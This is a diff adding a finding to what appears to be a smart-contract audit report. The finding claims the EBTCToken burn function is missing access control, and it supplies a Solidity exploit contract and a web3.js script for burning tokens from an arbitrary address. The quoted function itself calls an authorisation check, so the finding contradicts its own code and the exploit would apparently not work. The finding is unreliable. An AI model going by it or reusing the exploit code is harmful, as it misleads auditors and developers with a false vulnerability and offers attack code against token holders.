@@ -321,3 +321,118 @@ Just utilise the approve method of the ERC/BEP standard to update the allowed va
 Token possessor must confirm the first transaction has been mined from N to 0, that is, that the sender did not transfer a part of N allowed tokens prior to the first transaction was committed. 
 These checks are doable utilising complicated blockchain explorers like `[Etherscan.io](https://etherscan.io/)`
 Alternative ways to avoid the vulnerability is to approve token transfers solely to smart contracts that are verified code which do not contain business logic for carrying front running attacks also to accounts owned by users you know well.
+## [L-04] Public burn in the EBTCToken contract
+## Impact
+The contract was found to be using public or an external burn function. The function was missing access control to prevent another user from burning their tokens. Also, the burn function was found to be using a different address than msg.sender.
+
+Unauthorised Token Destruction: If an attacker could call the burn function without proper authorization, they could potentially destroy tokens at will. This could lead to a decrease in the total supply of tokens, affecting the token's value and the overall economy of the token.
+
+Loss of Funds: If an attacker could manipulate the _amount parameter of the burn function, they could potentially burn more tokens than they should be able to. This could result in users losing their tokens without any transaction or approval.
+
+Disruption of Operations: If the burn function is used in other operations (like in a staking mechanism), an exploit could disrupt these operations. This could lead to a loss of service and potential financial loss for users.
+
+## Proof of Concept
+**Vulnerable burn function**
+```sol
+// ln 95-98
+    function burn(address _account, uint256 _amount) external override {
+        _requireCallerIsBOorCdpMOrAuth();
+        _burn(_account, _amount);
+    }
+```
+**Exploit burn**
+```sol
+// SPDX-License-Identifier: MIT
+
+pragma solidity >=0.8.17;
+
+import "./EBTCToken.sol";
+
+contract tEBTCToken {
+
+   EBTCToken public x1;
+
+   constructor(EBTCToken _x1) {
+
+      x1 = EBTCToken(_x1);
+
+   }
+
+   function testBurn(EBTCToken _x1) external payable {
+
+      x1.burn(address(_x1), uint256(1e18));
+
+   }
+
+   }
+```
+
+**Here's a step-by-step guide on how to do it using web3.js, assuming you're working in a Node.js environment:**
+
+1. Install the necessary dependencies:
+   Make sure you have Node.js installed, and then create a new Node.js project and install web3.js.
+
+   ```bash
+   npm init -y
+   npm install web3
+   ```
+
+2. Create a JavaScript file (e.g., `burnToken.js`) and require the web3.js library:
+
+   ```javascript
+   const Web3 = require('web3');
+   const web3 = new Web3('YOUR_ETHEREUM_NODE_URL'); // Replace with your Ethereum node URL
+   const accountAddress = 'YOUR_SENDER_ADDRESS'; // Replace with your Ethereum address
+
+   // Import the ABI (Application Binary Interface) of the EBTCToken contract
+   const ebtctokenAbi = [ /* Paste the ABI here */ ];
+   const ebtctokenContractAddress = 'YOUR_EBTCTOKEN_CONTRACT_ADDRESS'; // Replace with the contract address
+
+   // Create a new contract instance
+   const ebtctokenContract = new web3.eth.Contract(ebtctokenAbi, ebtctokenContractAddress);
+
+   // Function to call the burn function
+   async function burnTokens(account, amount) {
+     try {
+       // Replace with the appropriate call to _requireCallerIsBOorCdpMOrAuth() if needed
+       // Use web3.js to send a transaction to the burn function
+       const gasPrice = 'YOUR_GAS_PRICE'; // Replace with the desired gas price
+       const gasLimit = 'YOUR_GAS_LIMIT'; // Replace with the desired gas limit
+
+       const transaction = ebtctokenContract.methods.burn(account, amount).send({
+         from: accountAddress,
+         gasPrice: web3.utils.toWei(gasPrice, 'gwei'),
+         gas: gasLimit,
+       });
+
+       const receipt = await transaction;
+       console.log('Transaction receipt:', receipt);
+     } catch (error) {
+       console.error('Error burning tokens:', error);
+     }
+   }
+
+   // Call the burnTokens function with the desired parameters
+   burnTokens('ADDRESS_TO_BURN_FROM', AMOUNT_TO_BURN);
+   ```
+
+3. Replace the placeholders in the code:
+   - Replace `'YOUR_ETHEREUM_NODE_URL'` with the URL of your Ethereum node.
+   - Replace `'YOUR_SENDER_ADDRESS'` with the Ethereum address that will send the transaction.
+   - Replace the `ebtctokenAbi` array with the ABI of your EBTCToken contract.
+   - Replace `'YOUR_EBTCTOKEN_CONTRACT_ADDRESS'` with the address of the EBTCToken contract.
+   - Define the `burnTokens` function to handle the burning of tokens.
+   - Set the gas price and gas limit according to your requirements.
+   - Replace `'ADDRESS_TO_BURN_FROM'` and `AMOUNT_TO_BURN` with the recipient address and the amount of tokens to burn.
+
+4. Run the JavaScript file using Node.js:
+
+   ```bash
+   node burnToken.js
+   ```
+
+This script will send a transaction to the `burn` function in your EBTCToken contract, effectively burning tokens from the specified account. Make sure to handle errors and manage your private key securely when dealing with real tokens and contracts on the Ethereum network.
+## Tools Used
+VS Code.
+## Recommended Mitigation Steps
+Consider adding access control modifiers to the burn function to prevent another user from burning their tokens. The burn function should use msg.sender in the _from argument.
